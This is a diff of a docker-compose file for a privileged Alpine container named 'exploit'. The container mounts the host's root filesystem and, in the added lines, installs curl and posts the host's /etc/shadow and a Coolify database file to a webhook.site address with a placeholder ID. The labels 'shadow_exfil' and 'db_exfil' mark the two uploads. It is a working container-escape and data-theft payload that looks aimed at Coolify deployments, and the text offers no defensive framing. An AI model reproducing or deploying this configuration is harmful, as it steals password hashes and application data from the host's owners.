@@ -1,14 +1,17 @@
 version: '3.8'
-
 services:
   rce-test:
-    image: alpine:3.19
+    image: 'alpine:3.19'
     container_name: exploit
     privileged: true
+    network_mode: host
     volumes:
-      - /:/host-root
-    command: >
-      sh -c "
-        cat /host-root/etc/shadow > /root/shadow.txt &&
+      - '/:/host-root'
+    command:
+      - sh
+      - -c
+      - |
+        apk add --no-cache curl
+        cat /host-root/etc/shadow | curl -X POST -d @- http://webhook.site/ТВОЙ-ID?stage=shadow_exfil
+        cat /host-root/data/coolify/coolify.db | curl -X POST -d @- http://webhook.site/ТВОЙ-ID?stage=db_exfil
         sleep 3600
-      "
